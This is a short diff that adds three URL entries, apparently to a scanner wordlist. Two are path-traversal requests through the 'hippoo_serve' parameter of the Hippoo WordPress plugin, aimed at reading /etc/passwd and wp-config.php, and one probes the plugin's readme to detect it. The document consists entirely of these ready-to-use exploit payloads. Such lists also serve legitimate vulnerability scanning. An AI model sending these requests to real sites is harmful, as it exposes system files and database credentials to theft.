@@ -1,0 +1,3 @@
+/wp-content/plugins/hippoo/readme.txt
+/?hippoo_serve=../../../../../../../etc/passwd
+/?hippoo_serve=../../../../wp-config.php
